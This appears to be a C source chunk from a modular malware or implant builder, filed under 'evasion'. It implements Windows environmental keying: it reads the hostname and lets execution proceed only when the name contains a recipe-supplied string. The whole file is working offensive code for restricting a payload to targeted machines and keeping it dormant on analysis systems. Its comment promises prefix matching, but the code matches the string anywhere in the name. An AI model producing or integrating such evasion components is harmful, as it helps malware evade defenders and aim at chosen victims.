// chunk: evasion/env_key_hostname
// depends: (none)
// provides: env_check_hostname
// headers: windows.h
// risk: low
// note: Environmental keying — only execute if hostname matches a prefix pattern.
//       Set ENV_KEY_HOSTNAME var in recipe (e.g., "WS-" to match "WS-PC01").

#ifndef CHUNK_ENV_KEY_HOSTNAME
#define CHUNK_ENV_KEY_HOSTNAME

#include <windows.h>

#ifndef ENV_KEY_HOSTNAME
#define ENV_KEY_HOSTNAME "{{ENV_KEY_HOSTNAME}}"
#endif

static int env_check_hostname(void) {
    char hostname[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    DWORD size = sizeof(hostname);
    if (!GetComputerNameA(hostname, &size))
        return 0;

    const char *prefix = ENV_KEY_HOSTNAME;
    if (prefix[0] == '\0')
        return 1;

    for (int i = 0; hostname[i]; i++)
        if (hostname[i] >= 'A' && hostname[i] <= 'Z')
            hostname[i] += 32;
    char lower_prefix[64] = {0};
    int j = 0;
    for (; prefix[j] && j < 63; j++)
        lower_prefix[j] = (prefix[j] >= 'A' && prefix[j] <= 'Z') ? prefix[j] + 32 : prefix[j];
    if (strstr(hostname, lower_prefix))
        return 1;
    return 0;
}

#endif
